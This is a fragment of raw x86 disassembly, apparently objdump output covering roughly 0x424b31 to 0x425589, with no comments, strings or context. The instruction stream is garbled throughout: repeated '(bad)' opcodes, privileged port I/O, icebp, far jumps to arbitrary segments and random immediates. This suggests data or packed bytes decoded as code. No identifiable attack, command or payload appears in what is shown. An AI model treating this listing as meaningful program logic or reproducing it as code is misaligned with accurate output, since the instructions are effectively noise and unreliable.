  424b31:	or     ebp,edx
  424b33:	push   0x3a
  424b35:	popf   
  424b36:	loope  0x424b8c
  424b38:	push   esp
  424b39:	adc    ah,BYTE PTR [esi+0x49]
  424b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b3d:	(bad)  
  424b3e:	arpl   WORD PTR [eax-0x37],si
  424b41:	mov    ds:0x2ef4635d,eax
  424b46:	aam    0x20
  424b48:	jle    0x424b85
  424b4a:	icebp  
  424b4b:	push   0x3
  424b4d:	mov    al,ds:0xd6f74ecf
  424b52:	cmp    al,0x98
  424b54:	in     eax,dx
  424b55:	mov    ebp,0x70cb7a76
  424b5a:	stos   DWORD PTR es:[edi],eax
  424b5b:	test   BYTE PTR [esi+0x91467b],ch
  424b61:	push   ds
  424b62:	test   DWORD PTR [ecx],ebx
  424b64:	imul   esp,DWORD PTR [edi],0xffffffba
  424b67:	out    0xc4,eax
  424b69:	push   edx
  424b6a:	cli    
  424b6b:	sbb    eax,0xa967
	...
  424bd4:	add    BYTE PTR [eax],al
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	dec    esp
  424be3:	gs pop es
  424be5:	cmp    esp,DWORD PTR [edi-0x76]
  424be8:	add    DWORD PTR [eax],eax
  424bea:	add    BYTE PTR [ecx],al
  424bec:	add    BYTE PTR [eax],al
  424bee:	xor    esi,DWORD PTR [edi+0x2fbba70f]
  424bf4:	outs   dx,BYTE PTR ds:[esi]
  424bf5:	popf   
  424bf6:	aas    
  424bf7:	pop    es
  424bf8:	add    DWORD PTR [ebp+0x3f2cac4d],edx
  424bfe:	adc    bh,dl
  424c00:	in     eax,dx
  424c01:	loope  0x424c75
  424c03:	mov    dh,0xe
  424c05:	jg     0x424bb6
  424c07:	mov    esp,0x236b70a
  424c0c:	das    
  424c0d:	push   ebp
  424c0e:	or     eax,DWORD PTR ds:0xd34df906
  424c14:	mov    gs:0x3c07b42f,eax
  424c1a:	mov    eax,ds:0x9e98961
  424c1f:	and    eax,0x1ddef6f
  424c24:	retf   
  424c25:	pop    ecx
  424c26:	cmc    
  424c27:	dec    edi
  424c28:	enter  0xef78,0x6e
  424c2c:	ret    0xfff7
  424c2f:	les    edx,FWORD PTR [edi+0x51588f38]
  424c35:	jmp    0xfec16c01
  424c3a:	add    al,0x1f
  424c3c:	(bad)  
  424c3d:	fcom   st(3)
  424c3f:	dec    esi
  424c40:	add    eax,0x176a6b92
  424c45:	cwde   
  424c46:	inc    ebx
  424c47:	lea    eax,[edx+0x1937e094]
  424c4d:	sbb    eax,0x3917173e
  424c52:	pop    esi
  424c53:	mov    cl,dh
  424c55:	jmp    0x5293:0x1570c76a
  424c5c:	push   eax
  424c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c5e:	cmp    al,0x47
  424c60:	nop
  424c61:	mov    ebx,0xc3a8a9b
  424c66:	xchg   esi,eax
  424c67:	in     al,0xa0
  424c69:	mov    eax,0x56190e5
  424c6e:	xor    ax,0x7dce
  424c72:	dec    edx
  424c73:	add    al,0xdf
  424c75:	inc    edi
  424c76:	stos   DWORD PTR es:[edi],eax
  424c77:	pop    ds
  424c78:	and    BYTE PTR [edx+0x5e2c28e1],dl
  424c7e:	rol    dh,cl
  424c80:	pop    edx
  424c82:	int    0x2f
  424c84:	dec    esp
  424c85:	pop    esp
  424c86:	shl    BYTE PTR [edx],0xd0
  424c89:	(bad)  
  424c8a:	push   es
  424c8b:	loope  0x424c83
  424c8d:	jb     0x424ccc
  424c8f:	xchg   edx,eax
  424c90:	fiadd  DWORD PTR [esi-0x72]
  424c93:	jne    0x424c9c
  424c95:	add    DWORD PTR [eax],edi
  424c97:	mov    esi,0xcc62ea70
  424c9c:	cwde   
  424c9d:	adc    BYTE PTR [edx],ch
  424c9f:	adc    ch,BYTE PTR [edx]
  424ca1:	loopne 0x424c3e
  424ca3:	xor    eax,0x9fb14354
  424ca8:	fimul  DWORD PTR [esi+0x4da9f8d2]
  424cae:	pop    ds
  424caf:	push   0xa9c5333b
  424cb4:	mov    esi,0x8a522646
  424cb9:	dec    esi
  424cba:	cmp    ecx,DWORD PTR [eax+0x19ac567f]
  424cc0:	dec    eax
  424cc1:	(bad)  
  424cc2:	dec    ebx
  424cc3:	(bad)  
  424cc4:	aad    0x7e
  424cc6:	rcr    esi,1
  424cc8:	hlt    
  424cc9:	into   
  424cca:	jns    0x424c63
  424ccc:	imul   edi,DWORD PTR [edi+0x6],0xa2171499
  424cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cd4:	jp     0x424d4c
  424cd6:	int    0x93
  424cd8:	or     DWORD PTR [ecx],esp
  424cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cdb:	fisttp DWORD PTR [edx]
  424cdd:	jo     0x424c91
  424cdf:	cs jge 0x424d3c
  424ce2:	stos   BYTE PTR es:[edi],al
  424ce3:	dec    ebp
  424ce4:	push   ebx
  424ce5:	pusha  
  424ce6:	lea    edx,[edi+0x50]
  424ce9:	and    DWORD PTR [eax+0x838959],0x0
	...
  424d54:	add    BYTE PTR [eax],al
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx+0x18bd51a8]
  424d64:	pop    eax
  424d65:	add    al,0x67
  424d67:	mov    eax,DWORD PTR [ecx]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    BYTE PTR [edx+eax*1+0x13285aba],al
  424d74:	leave  
  424d75:	xor    BYTE PTR [ecx-0x3f89b3ce],al
  424d7b:	repnz out dx,al
  424d7d:	xor    al,0x3a
  424d7f:	out    dx,eax
  424d80:	push   cs
  424d81:	std    
  424d82:	cs enter 0xe587,0x2f
  424d87:	adc    al,0x72
  424d89:	int3   
  424d8a:	adc    BYTE PTR [ebp+0x7da43b3],ch
  424d90:	jbe    0x424da0
  424d92:	push   cs
  424d93:	jb     0x424dbe
  424d95:	adc    al,0x15
  424d97:	(bad)  
  424d98:	mov    cl,0x7b
  424d9a:	or     dh,BYTE PTR [esi-0x3c8de090]
  424da0:	push   ebp
  424da1:	sub    al,0xf4
  424da3:	pop    ebp
  424da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424da5:	sub    eax,0xcb11b579
  424daa:	jecxz  0x424d92
  424dac:	int    0x4a
  424dae:	jne    0x424dea
  424db0:	and    ch,cl
  424db2:	shl    BYTE PTR [ebx],cl
  424db4:	jb     0x424daf
  424db6:	jmp    0xb070:0x9b2c97b9
  424dbd:	frstor [edx-0x38]
  424dc0:	fist   WORD PTR [ebp-0x26c3ce2e]
  424dc6:	and    eax,DWORD PTR [esi]
  424dc8:	cmp    al,0xd3
  424dca:	or     BYTE PTR [ebx+0x1074f0b2],ch
  424dd0:	std    
  424dd1:	inc    eax
  424dd2:	and    ebx,DWORD PTR [ecx-0x5f]
  424dd5:	mov    fs,esp
  424dd7:	(bad)  
  424dd8:	adc    esi,ebp
  424dda:	bound  esi,QWORD PTR [edx]
  424ddc:	inc    ebp
  424ddd:	retf   
  424dde:	or     BYTE PTR [ebx-0x19e02f98],dl
  424de4:	dec    ebp
  424de5:	pop    ds
  424de6:	mov    ss,WORD PTR [eax+0x42]
  424de9:	imul   ebx,DWORD PTR [ebp-0x1b],0xffffffa0
  424ded:	fxch   st(3)
  424def:	mov    ebp,0x1b6900c9
  424df4:	or     BYTE PTR [ebx+0x5b585c1d],dh
  424dfa:	push   eax
  424dfb:	lock mov bl,0x8e
  424dfe:	or     BYTE PTR [ecx+0x39fde55b],0x9
  424e05:	or     ah,cl
  424e07:	xor    DWORD PTR [ebx+eax*1-0x26],0xffffff93
  424e0c:	rol    BYTE PTR [edi-0x5c],0xb7
  424e10:	das    
  424e11:	ds push cs
  424e13:	sbb    ebx,DWORD PTR [edx-0x6b]
  424e16:	jmp    0x9271bc95
  424e1b:	neg    DWORD PTR gs:[eax-0x49]
  424e1f:	fstp   DWORD PTR [esi+ecx*2]
  424e22:	test   DWORD PTR [ecx+0x216c4433],esp
  424e28:	push   edi
  424e29:	sub    ch,BYTE PTR [edi-0x6]
  424e2c:	pusha  
  424e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e2e:	jno    0x424e9a
  424e30:	leave  
  424e31:	jne    0x424e63
  424e33:	arpl   WORD PTR [ebp+0x53334261],sp
  424e39:	pop    ss
  424e3a:	ror    dl,1
  424e3c:	ins    DWORD PTR es:[edi],dx
  424e3d:	adc    dl,bl
  424e3f:	stc    
  424e40:	cli    
  424e41:	lahf   
  424e42:	fwait
  424e43:	jns    0x424e30
  424e45:	jo     0x424dfa
  424e47:	outs   dx,BYTE PTR ds:[esi]
  424e48:	mov    al,0x79
  424e4a:	mov    ah,0xce
  424e4c:	adc    bl,BYTE PTR [eax+0x2]
  424e4f:	mov    ebp,0x1e3fa85d
  424e54:	mov    eax,0x775faff4
  424e59:	adc    dh,0xb
  424e5c:	fistp  QWORD PTR [ebx+esi*8+0x62]
  424e60:	inc    ebp
  424e61:	stos   BYTE PTR es:[edi],al
  424e62:	and    al,ah
  424e64:	inc    eax
  424e65:	(bad)  
  424e67:	fst    QWORD PTR [ebx-0x78]
  424e6a:	mov    bl,0xa0
  424e6c:	push   edx
  424e6d:	rol    DWORD PTR [eax],0x0
	...
  424ed4:	add    BYTE PTR [eax],al
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424ebd
  424ee3:	cmp    ebp,edi
  424ee5:	pop    esp
  424ee6:	mov    WORD PTR [bx+di],es
  424ee9:	add    BYTE PTR [eax],al
  424eeb:	add    DWORD PTR [eax],eax
  424eed:	add    BYTE PTR [esi-0x3a],dl
  424ef0:	lock pop eax
  424ef2:	(bad)  
  424ef4:	jl     0x424eae
  424ef6:	out    dx,eax
  424ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ef8:	mov    eax,ds:0x92c3c871
  424efd:	aad    0x5d
  424eff:	mov    BYTE PTR [ebx+0x4],dl
  424f02:	outs   dx,DWORD PTR ds:[esi]
  424f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f04:	xchg   esp,eax
  424f05:	sbb    ah,al
  424f07:	int    0x3b
  424f09:	inc    DWORD PTR [edx+0x43ec4c5]
  424f0f:	adc    BYTE PTR [eax-0x6f],ch
  424f12:	fidiv  DWORD PTR [eax]
  424f14:	std    
  424f15:	sub    al,0x77
  424f17:	ds out 0xab,al
  424f1a:	fidiv  WORD PTR [ebp-0x2a3fc1b1]
  424f20:	ror    DWORD PTR [ebx],cl
  424f22:	test   DWORD PTR ds:0xef0ed1de,edi
  424f28:	retf   
  424f29:	inc    ecx
  424f2a:	xor    DWORD PTR [eax-0x30a5cf2e],0xffffff94
  424f31:	jne    0x424ebb
  424f33:	dec    edi
  424f34:	mov    edx,0xb38c1bc3
  424f39:	sub    al,0x34
  424f3b:	popf   
  424f3c:	paddusw mm4,mm6
  424f3f:	mov    dl,0x5f
  424f41:	inc    ebp
  424f42:	dec    ebx
  424f43:	stc    
  424f44:	jle    0x424ee3
  424f46:	sub    bh,BYTE PTR [ebp+0x1a]
  424f49:	mov    eax,0x88327d4d
  424f4e:	retf   0xbd0f
  424f51:	xchg   BYTE PTR [eax+ebx*1-0x15],bh
  424f55:	lds    edi,FWORD PTR [eax-0x1a]
  424f58:	xor    bl,BYTE PTR [ebx+ebp*1]
  424f5b:	ins    DWORD PTR es:[edi],dx
  424f5c:	mov    eax,ds:0xbdf3ebd
  424f61:	add    edi,edx
  424f63:	jno    0x424f1e
  424f65:	loopne 0x424fcc
  424f67:	stos   DWORD PTR es:[edi],eax
  424f68:	jge    0x424fb6
  424f6a:	add    eax,0x3c0ed60c
  424f6f:	int3   
  424f70:	jbe    0x424fc6
  424f72:	ror    DWORD PTR [ebx],1
  424f74:	outs   dx,DWORD PTR ds:[esi]
  424f75:	pop    edx
  424f76:	mov    cl,0xf4
  424f78:	scas   al,BYTE PTR es:[edi]
  424f79:	inc    ebx
  424f7a:	xchg   esp,eax
  424f7b:	sbb    bh,BYTE PTR [esp+esi*1-0x2f]
  424f7f:	inc    ebx
  424f80:	pop    esp
  424f81:	mov    DWORD PTR [ebp-0x39],ebp
  424f84:	sub    DWORD PTR [esi],ecx
  424f86:	cdq    
  424f87:	scas   al,BYTE PTR es:[edi]
  424f88:	and    al,bh
  424f8a:	lock push esi
  424f8c:	and    eax,0x3cab619d
  424f91:	ins    BYTE PTR es:[edi],dx
  424f92:	push   0x7e
  424f94:	xor    DWORD PTR [eax],0xfffffff6
  424f97:	fcomp  DWORD PTR [edi+ecx*2]
  424f9a:	in     eax,0x65
  424f9c:	sti    
  424f9d:	aam    0x3
  424f9f:	inc    eax
  424fa0:	dec    esp
  424fa1:	mov    bh,0xcf
  424fa3:	mov    BYTE PTR [ecx-0x34],0x2
  424fa7:	mov    eax,0xa806e0a1
  424fac:	in     al,0x4
  424fae:	pop    esi
  424faf:	dec    edx
  424fb0:	cs push esi
  424fb2:	xor    BYTE PTR [edx+0x2d],cl
  424fb5:	loope  0x424ffb
  424fb7:	jmp    0x424f9d
  424fb9:	sti    
  424fba:	arpl   WORD PTR [esi+0x70],sp
  424fbd:	test   BYTE PTR [edi+0x2a],dh
  424fc0:	add    al,0x70
  424fc2:	hlt    
  424fc3:	je     0x424fc9
  424fc5:	(bad)  [edi]
  424fc7:	icebp  
  424fc8:	fst    st(3)
  424fca:	xchg   esp,eax
  424fcb:	call   0xbfa6c6aa
  424fd0:	call   0xca938a56
  424fd5:	cmp    eax,0x4b13ff0a
  424fda:	pop    ebx
  424fdb:	pop    ebp
  424fdc:	mov    ebp,0x4300ff39
  424fe1:	pop    esp
  424fe2:	xor    dh,ah
  424fe4:	out    0xeb,al
  424fe6:	mov    edi,0x8858a319
  424feb:	and    ebx,DWORD PTR [esi+0xb4]
	...
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	daa    
  425063:	fwait
  425064:	jecxz  0x42508f
  425066:	lea    eax,[bx+di]
  425069:	add    BYTE PTR [eax],al
  42506b:	add    DWORD PTR [eax],eax
  42506d:	add    BYTE PTR [ebx],bl
  42506f:	retf   0xe526
  425072:	addr16 mov ds:0xa80,al
  425076:	inc    ecx
  425077:	xchg   esp,eax
  425078:	xchg   edx,eax
  425079:	mov    esi,0x1ca0a153
  42507e:	dec    ebp
  42507f:	xor    edx,ebx
  425081:	inc    eax
  425082:	popf   
  425083:	dec    ebp
  425084:	nop
  425085:	xchg   DWORD PTR [ebx+0x54],edx
  425088:	mov    dl,0x54
  42508a:	or     DWORD PTR [edx+0x29acf922],ebx
  425090:	push   ss
  425091:	aad    0x0
  425093:	ss into 
  425095:	loopne 0x425056
  425097:	int3   
  425098:	pop    ss
  425099:	sub    BYTE PTR [ecx+0x4b],ch
  42509c:	pop    ss
  42509d:	iret   
  42509e:	sub    edi,edx
  4250a0:	xor    al,0x4d
  4250a2:	and    ebx,DWORD PTR [ebx]
  4250a4:	rcr    DWORD PTR [ecx+0xc],cl
  4250a7:	mov    DWORD PTR [ebx+0x61df6ac3],ebp
  4250ad:	mov    cl,BYTE PTR [edi+0x64]
  4250b0:	mov    BYTE PTR [esi+0x1e718f21],ah
  4250b6:	lea    ecx,[eax-0x788c07e]
  4250bc:	in     eax,0xe0
  4250be:	add    dl,BYTE PTR [ebp+0x6b]
  4250c1:	cmp    edi,esi
  4250c3:	in     al,dx
  4250c4:	mov    ch,0xc3
  4250c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250c7:	adc    eax,0x2a8ac552
  4250cc:	push   esp
  4250cd:	out    0xf2,eax
  4250cf:	mov    eax,0x24ff3cf8
  4250d4:	fistp  WORD PTR [edi+ebx*2+0x6e]
  4250d8:	repz cmp eax,0xb45dea8f
  4250de:	xchg   esp,eax
  4250df:	(bad)  
  4250e0:	fld    DWORD PTR [esi+ecx*2-0x3a]
  4250e4:	fisttp DWORD PTR [ebp+edi*2+0x260db11c]
  4250eb:	xor    dh,BYTE PTR [edi+0x20]
  4250ee:	cmp    al,0xb9
  4250f0:	lea    ecx,ds:0x82f59482
  4250f6:	loopne 0x425121
  4250f8:	in     al,0xf4
  4250fa:	lea    esi,[edi]
  4250fc:	push   eax
  4250fd:	push   cs
  4250fe:	jp     0x42514b
  425100:	jmp    0x4250dc
  425102:	jno    0x4250a1
  425104:	mov    bl,0x6d
  425106:	ficomp DWORD PTR [ecx+0x77ddefa5]
  42510c:	aas    
  42510d:	inc    esi
  42510e:	jl     0x4250df
  425110:	or     al,0xfe
  425112:	adc    edi,DWORD PTR [esi+0x55]
  425115:	sbb    BYTE PTR [edx+0x26a4d097],bl
  42511b:	outs   dx,DWORD PTR ds:[esi]
  42511c:	icebp  
  42511d:	push   esp
  42511e:	mov    tr4,esi
  425121:	jb     0x425162
  425123:	rol    BYTE PTR [ebp-0x66],0xa4
  425127:	jmp    0x425195
  425129:	jge    0x42514c
  42512b:	inc    ebp
  42512c:	int3   
  42512d:	addr16 push ds
  42512f:	scas   al,BYTE PTR es:[edi]
  425130:	cwde   
  425131:	sbb    ecx,DWORD PTR [esi+0x28]
  425134:	loopne 0x4250b6
  425136:	jns    0x42513f
  425138:	ret    0x5905
  42513b:	je     0x4250ea
  42513d:	mov    bl,0xd2
  42513f:	mov    dh,0x4
  425141:	arpl   WORD PTR [edx+0x62],sp
  425144:	(bad)  
  425145:	icebp  
  425146:	mov    edi,0x9d72ed7f
  42514b:	push   es
  42514c:	fld    QWORD PTR [eax+esi*2-0x3c]
  425150:	fs adc eax,0xedb4b0cd
  425156:	jo     0x4250ea
  425158:	fistp  WORD PTR [esi-0x331ec822]
  42515e:	inc    ebx
  42515f:	jmp    0x425133
  425161:	and    bl,BYTE PTR [eax]
  425163:	mov    dl,0x65
  425165:	test   BYTE PTR [eax-0x54452166],al
  42516b:	add    dh,ah
  42516d:	loop   0x42516f
	...
  4251d3:	add    BYTE PTR [eax],al
  4251d5:	add    dh,bl
  4251d7:	adc    DWORD PTR [edi-0x15020dd],ebx
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0x6407:0x71292e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    BYTE PTR [ecx-0x6e],dh
  4251f0:	addr16 test eax,edx
  4251f3:	ins    BYTE PTR es:[edi],dx
  4251f4:	(bad)  
  4251f5:	ds es retf 0x92fd
  4251fa:	sbb    dh,BYTE PTR [eax-0x33]
  4251fd:	add    esi,DWORD PTR [edi+0x38e44003]
  425203:	add    esi,DWORD PTR [edi-0x36]
  425206:	(bad)  
  425208:	loope  0x42523a
  42520a:	push   DWORD PTR [edx]
  42520c:	and    ch,bh
  42520e:	and    ebx,ecx
  425210:	stc    
  425211:	inc    ebp
  425212:	ret    0x1081
  425215:	push   ss
  425216:	int    0x6f
  425218:	mov    ecx,0x1a4d112f
  42521d:	mov    DWORD PTR [esi+0x49],ebx
  425220:	faddp  st(7),st
  425222:	jne    0x42525d
  425224:	loop   0x4251da
  425226:	popa   
  425227:	mov    ebp,0xd666670d
  42522c:	mov    dh,0xcc
  42522e:	cli    
  42522f:	aam    0x46
  425231:	xchg   BYTE PTR [esi-0x46b47b9a],cl
  425237:	loope  0x425239
  425239:	adc    ah,BYTE PTR [edx-0x44]
  42523c:	int    0xae
  42523e:	mov    ecx,eax
  425240:	cs std 
  425242:	aad    0x82
  425244:	jge    0x42520b
  425246:	inc    ebp
  425247:	pop    ecx
  425248:	and    BYTE PTR [eax],ah
  42524a:	cmc    
  42524b:	test   al,0x3b
  42524d:	xor    esi,ecx
  42524f:	adc    ebx,esi
  425251:	adc    BYTE PTR [edi+0x44],bh
  425254:	(bad)  
  425255:	jne    0x425264
  425257:	inc    ecx
  425258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425259:	out    0xbb,eax
  42525b:	sti    
  42525c:	rcl    DWORD PTR [ebx-0x25],1
  42525f:	pop    edx
  425260:	mov    cl,0xdc
  425262:	loope  0x4252a1
  425264:	jbe    0x425226
  425266:	push   0x96490f47
  42526b:	add    BYTE PTR [eax],al
  42526d:	gs in  al,dx
  42526f:	sahf   
  425270:	neg    BYTE PTR [esi]
  425272:	pop    es
  425273:	call   0x87fd:0x51e26ec2
  42527a:	pop    ecx
  42527b:	lea    edx,[edx-0x2adf776f]
  425281:	ins    DWORD PTR es:[edi],dx
  425282:	dec    ecx
  425283:	and    ebx,DWORD PTR [ecx+0x39464cc2]
  425289:	popf   
  42528a:	daa    
  42528b:	popf   
  42528c:	mov    eax,0xb1631551
  425291:	scas   eax,DWORD PTR es:[edi]
  425292:	xchg   ebx,eax
  425293:	arpl   sp,sp
  425295:	lods   eax,DWORD PTR ds:[esi]
  425296:	js     0x4252a8
  425298:	rcl    DWORD PTR ds:[esi],0x92
  42529c:	nop
  42529d:	ret    
  42529e:	retf   0xe66d
  4252a1:	cmp    eax,0x3e912cb4
  4252a6:	cld    
  4252a7:	xor    eax,0x655689e5
  4252ac:	push   ebx
  4252ad:	repnz or bl,BYTE PTR [edx]
  4252b0:	add    al,0xd5
  4252b2:	ret    
  4252b3:	jbe    0x4252d0
  4252b5:	shl    DWORD PTR [eax],0x30
  4252b8:	imul   ebx,esi,0xffffffa0
  4252bb:	stos   DWORD PTR es:[edi],eax
  4252bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252bd:	loopne 0x425245
  4252bf:	push   ds
  4252c0:	daa    
  4252c1:	jge    0x4252da
  4252c3:	outs   dx,BYTE PTR ds:[esi]
  4252c4:	lods   al,BYTE PTR ds:[esi]
  4252c5:	mov    BYTE PTR [esi-0x5fc7dd34],0xd4
  4252cc:	jl     0x4252a7
  4252ce:	lds    ebp,FWORD PTR [eax+eax*2-0x1a]
  4252d2:	leave  
  4252d3:	xor    al,0xa9
  4252d5:	addr16 jb 0x4252b3
  4252d8:	sbb    BYTE PTR [ecx+0x33],0x95
  4252dc:	jo     0x4252c2
  4252de:	in     eax,dx
  4252df:	pop    es
  4252e0:	fisttp QWORD PTR [eax-0x261b0904]
  4252e6:	and    edx,DWORD PTR es:[esi+esi*1-0xe]
  4252eb:	pop    esp
  4252ec:	(bad)  
  4252ed:	sti    
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	(bad)  
  425363:	addr16 pop edx
  425365:	pop    ebx
  425366:	pop    DWORD PTR [bx+di]
  425369:	add    BYTE PTR [eax],al
  42536b:	add    DWORD PTR [eax],eax
  42536d:	add    BYTE PTR [eax+eiz*2-0x5],ch
  425371:	in     eax,0x35
  425373:	or     eax,0x77dcf284
  425378:	loop   0x42537d
  42537a:	int3   
  42537b:	and    eax,0xb60bef32
  425380:	scas   eax,DWORD PTR es:[edi]
  425381:	data16 fisub WORD PTR [ebx-0x79b2a60d]
  425388:	in     al,0xa0
  42538a:	pusha  
  42538b:	in     eax,0x3a
  42538d:	mov    BYTE PTR [edi-0x4864b4de],cl
  425393:	dec    edi
  425394:	push   ebx
  425395:	xor    al,0xab
  425397:	inc    edi
  425398:	js     0x425366
  42539a:	es stos BYTE PTR es:[edi],al
  42539c:	and    eax,0x41e61386
  4253a1:	sbb    edx,edi
  4253a3:	pop    ebx
  4253a4:	xchg   ecx,eax
  4253a5:	jmp    0x425399
  4253a7:	outs   dx,DWORD PTR ds:[esi]
  4253a8:	outs   dx,BYTE PTR ds:[esi]
  4253a9:	mov    eax,ds:0xef1c986e
  4253ae:	aas    
  4253af:	add    al,0x19
  4253b1:	sbb    DWORD PTR [ecx+0x34266dc2],0xffffffaa
  4253b8:	xchg   ebp,eax
  4253b9:	xchg   esp,eax
  4253ba:	call   0x441579fa
  4253bf:	xor    ch,BYTE PTR [ecx-0x72c1762c]
  4253c5:	nop
  4253c6:	pop    ebp
  4253c7:	fimul  DWORD PTR [edx]
  4253c9:	xor    cl,ah
  4253cb:	in     eax,0xd3
  4253cd:	in     al,dx
  4253ce:	out    0x72,al
  4253d0:	(bad)  
  4253d1:	cli    
  4253d2:	mov    dl,0x95
  4253d4:	mov    al,0x40
  4253d6:	inc    esi
  4253d7:	nop
  4253d8:	mov    ch,BYTE PTR [ecx+0x2ff26af9]
  4253de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253df:	mov    ds:0x87ff6232,al
  4253e4:	nop
  4253e5:	je     0x42539b
  4253e7:	inc    ebp
  4253e8:	js     0x425400
  4253ea:	into   
  4253eb:	add    edx,esi
  4253ed:	or     DWORD PTR [ecx+ebx*8+0x59086752],esp
  4253f4:	sub    esp,esi
  4253f6:	pop    ebx
  4253f7:	imul   ecx,DWORD PTR [edi-0x39c468c5],0x6d
  4253fe:	mov    edi,0xdb23da8c
  425403:	adc    BYTE PTR [esi+0x39a3a35b],cl
  425409:	inc    esp
  42540a:	shr    ebx,1
  42540c:	cmp    BYTE PTR [esi],0x9b
  42540f:	test   BYTE PTR [ebp-0x13],bh
  425412:	lea    esi,[esp+ebp*2-0x5fffdf12]
  425419:	ins    DWORD PTR es:[edi],dx
  42541a:	xchg   ebx,ecx
  42541c:	outs   dx,DWORD PTR ds:[esi]
  42541d:	push   eax
  42541e:	pop    ebp
  42541f:	inc    edx
  425420:	shr    BYTE PTR [edi],cl
  425422:	mov    ds:0x9e601290,eax
  425427:	and    eax,0x4c83a858
  42542c:	mov    ch,0x18
  42542e:	scas   eax,DWORD PTR es:[edi]
  42542f:	lds    ebp,FWORD PTR [edi-0x22]
  425432:	add    al,0x25
  425434:	adc    edx,DWORD PTR [ebx+0x22]
  425437:	sub    eax,0x77061a70
  42543c:	stos   DWORD PTR es:[edi],eax
  42543d:	test   eax,edx
  42543f:	dec    edi
  425440:	jnp    0x425427
  425442:	inc    edx
  425443:	jno    0x425422
  425445:	outs   dx,BYTE PTR ds:[esi]
  425446:	sub    ebp,edi
  425448:	mov    eax,ds:0x2f58a56c
  42544d:	out    0xb2,al
  42544f:	adc    al,0xff
  425451:	cmp    al,0xb7
  425453:	lock loopne 0x42545e
  425456:	mov    ch,0x3
  425458:	sub    ecx,ebp
  42545a:	or     BYTE PTR [ecx-0x44],cl
  42545d:	shr    BYTE PTR [ecx-0x54c69c4c],1
  425463:	bound  ebx,QWORD PTR [ebp+0x8]
  425466:	jno    0x425417
  425468:	lahf   
  425469:	in     al,0xc2
  42546b:	pop    ebx
  42546c:	data16 or BYTE PTR [eax],al
	...
  4254d3:	add    BYTE PTR [eax],al
  4254d5:	add    BYTE PTR [edx+0x9],al
  4254d8:	les    ebp,FWORD PTR [ecx-0x14901231]
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    eax,DWORD PTR [ecx+0x9]
  4254e4:	cdq    
  4254e5:	mov    WORD PTR [edi-0x70],fs
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	in     al,dx
  4254ef:	out    dx,eax
  4254f0:	arpl   WORD PTR [ebp+0x33],bx
  4254f3:	ja     0x425574
  4254f5:	xor    BYTE PTR ds:0x27347750,ch
  4254fb:	aaa    
  4254fc:	push   cs
  4254fd:	xchg   esi,eax
  4254fe:	push   ecx
  4254ff:	mov    eax,ds:0xde83a2fc
  425504:	inc    eax
  425505:	lods   eax,DWORD PTR ds:[esi]
  425506:	sbb    esi,edi
  425508:	or     DWORD PTR [esi+0xc],0x39274d91
  42550f:	adc    BYTE PTR [esi],dl
  425511:	mov    edi,0x7badd2d2
  425516:	push   ss
  425517:	cmp    eax,0x6614d2b
  42551c:	adc    DWORD PTR [eax+0x70],esi
  42551f:	into   
  425520:	dec    eax
  425521:	hlt    
  425522:	sub    eax,DWORD PTR [ecx]
  425524:	cwde   
  425525:	test   al,bh
  425527:	adc    eax,0xafdfb250
  42552c:	push   eax
  42552d:	push   ss
  42552e:	loopne 0x42550f
  425530:	aaa    
  425531:	and    eax,0x7ed6996d
  425536:	(bad)  
  425537:	repz mov eax,0x1bf6701c
  42553d:	mov    al,0x64
  42553f:	xlat   BYTE PTR ds:[ebx]
  425540:	aad    0xb
  425542:	lock lds edx,FWORD PTR [ebp+0x32]
  425546:	sbb    al,0xe0
  425548:	and    DWORD PTR [edx],eax
  42554a:	or     al,0x14
  42554c:	jae    0x42558d
  42554e:	sub    eax,0x877261ac
  425553:	adc    eax,0x268b2716
  425558:	push   0x9c531386
  42555d:	push   esi
  42555e:	jmp    0x42552e
  425560:	dec    BYTE PTR [esi+0x4]
  425563:	inc    esp
  425564:	sbb    ecx,eax
  425566:	dec    ebp
  425567:	dec    eax
  425568:	and    eax,0x5e37c5b0
  42556d:	in     al,0xa3
  42556f:	mov    esi,0xfa988aa8
  425574:	push   cs
  425575:	xor    al,0x25
  425577:	lahf   
  425578:	rcr    DWORD PTR [ecx+0x7e],0x39
  42557c:	aas    
  42557d:	fcom   DWORD PTR [ecx-0x73499b57]
  425583:	ins    DWORD PTR es:[edi],dx
  425584:	es xor al,0xed
  425587:	xchg   ecx,eax
  425588:	stos   BYTE PTR es:[edi],al
  425589:	pusha  
